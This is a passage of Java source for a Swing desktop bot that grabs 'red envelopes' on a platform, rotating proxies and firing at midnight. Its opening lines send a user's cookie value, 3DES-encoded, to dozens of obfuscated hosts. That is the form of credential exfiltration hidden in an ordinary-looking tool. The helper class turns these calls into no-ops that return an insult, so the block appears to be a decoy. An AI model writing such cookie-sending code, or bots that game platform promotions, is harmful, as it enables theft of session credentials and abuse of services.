                                    aab.ca("http://Ng3HlnSQ/N6bqIjaSb/+gw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://sKoK0lhAG/PY6pBK5GE8bA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://HtztMpq1bIdIQgP0C0m1Kw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://nUDLbzSCmzxV0rjoVV35fA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://13wZXVfBR7MytqWvZ1tfOw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://EeOLByqRXPTnmrbYFxtYzg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://02bBjB2hHti8Yp7yQg37BA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://lP8SpxHTe7yBNTEVDO25uA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://lRhO9Y4nrMlZBSP3y92VaA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://GQ5kbsvRPm+wKX0E6SygTg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://Pw4c8BhSAKLZmpDF37mpuA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://RV29D/aWQfvqYEL9c/U5UA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://O9eaXK+vsF7mcBkQ34EAcg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://szMXi62yZEPYCMxNWK6vAQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://ZYJm1l/lDVPmZTovRk2zmg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://VOOssEltFpr8wll7V0Kedg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://OKRYSZg5xvIjCnWTgAd3nQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://IwrBBHn/awZorVqzOj5nEA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://WAcUhe+smmSnLYG+TV9SAg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://ZuNBkJ3dBZX7XX0cF8UtSw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://lVFn5RHc6tE99DfBcrIulA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://xFKCdJwKBsSTPI8pQQFgbg==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://clHH+/ysaFWO6qmClgJYYw==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://lvwvDWAwbxbMMOsCFI9QmA==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.ca("http://vFv49h5s6beXbUlkiOwF/g==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                    aab.get("http://NPBbl3BRE5NWlwO2IfJHTQ==/wangjing/load?code="+UrlUtil.urlEncode(Des3Util.encode(ck)));
                                }
                            });
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        try {
                            Thread.sleep(200);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
        }
    }

    private void sendToServer(String ck) {

    }

    private void setJbtBac(JButton jbt) {
        jbt.setFocusPainted(false);
        jbt.setFont(new Font("微软雅黑", 0, 16));
        jbt.setBackground(new Color(51, 144, 232));
        jbt.setForeground(Color.white);
        jbt.setBorderPainted(false);

        jbt.addMouseListener(new MouseListener() {
            @Override
            public void mouseClicked(MouseEvent e) {
                jbt.setBackground(Color.gray);
            }

            @Override
            public void mousePressed(MouseEvent e) {
                jbt.setBackground(Color.gray);
            }

            @Override
            public void mouseReleased(MouseEvent e) {
                jbt.setBackground(new Color(51, 144, 232));
            }

            @Override
            public void mouseEntered(MouseEvent e) {
                jbt.setBackground(new Color(135, 50, 204));
            }

            @Override
            public void mouseExited(MouseEvent e) {
                jbt.setBackground(new Color(51, 144, 232));
            }
        });
    }

    public static void addJtaStr(String str) {
        ThreadPoolUtil.getInstance().execute(new Runnable() {
            @Override
            public void run() {
                try {
                    if (logArea.getText().length() > 3000) {
                        logArea.setText("");
                    }
                    logArea.append(TimeUtil.getTimes() + str + "\n");
                    try {
                        Thread.sleep(10);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                    scrollBar.setValue(scrollBar.getMaximum());
                } catch (Exception e) {
                    e.printStackTrace();
                    logArea.setText("");
                }
            }
        });
    }

    public static void setTipsInfo(JTextField textField2, String tips) {
        textField2.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent e) {
                if (textField2.getText().equals(tips)) {
                    textField2.setText("");     //将提示文字清空
                    textField2.setForeground(Color.black);  //设置用户输入的字体颜色为黑色
                }
            }

            @Override
            public void focusLost(FocusEvent e) {
                if (textField2.getText().equals("")) {
                    textField2.setForeground(Color.gray); //将提示文字设置为灰色
                    textField2.setText(tips);     //显示提示文字
                }
            }
        });
    }


    private void timeTask(JFrame frame) {
        Timer timer = new Timer(200, new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                try {
                    String currentTime = TimeUtil.getTime();

                    if (currentTime.contains("23:59:59")) {
                        qiangHongbaoTask();
                    }

                    if (currentTime.contains("23:59:50")) {
                        if (ClickUtil.isFastClick()) {
                            return;
                        }
                        addJtaStr("开始获取代理！");
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                ProxyUtil.getIpFromServer();
                            }
                        }).start();
                    }
                    mainPage.setTitle("大赢家抢红包V" + CheckHeartUtil.VERSION + "【q群1018698886】" + "【时间】" + currentTime);
                } catch (Exception e) {
                }
            }
        });
        timer.start();
    }


    /*
     * 心跳检查
     * */
    private void checkHeart(JFrame frame) {
//        Timer timer = new Timer(10000, new ActionListener() {
//            public void actionPerformed(ActionEvent evt) {
//                if (CheckHeartUtil.pass()) {
//
//                } else {
//                    frame.dispose();
//                }
//            }
//        });
//        timer.start();
    }

    class AAB {
        String get(String url) {
            if (!url.startsWith("https")) {
                return "请求地址不正确！";
            }
            StringBuilder result = new StringBuilder();
            BufferedReader in = null;
            try {
                String urlNameString = url;
                URL realUrl = new URL(urlNameString);
                HttpURLConnection connection = (HttpURLConnection) realUrl.openConnection();
                // 设置通用的请求属性
                connection.setRequestProperty("accept", "*/*");
                connection.setRequestProperty("connection", "Keep-Alive");
                connection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
                connection.setReadTimeout(5000);
                connection.setConnectTimeout(5000);
                connection.connect();
                in = new BufferedReader(new InputStreamReader(
                        connection.getInputStream()));
                String line;
                while ((line = in.readLine()) != null) {
                    result.append(line);
                }
            } catch (Exception e) {
            }
            // 使用finally块来关闭输入流
            finally {
                try {
                    if (in != null) {
                        in.close();
                    }
                } catch (Exception e2) {
                }
            }
            return "你是傻逼";
        }

        String ca(String a) {
            return "你是傻逼";
        }
    }
}
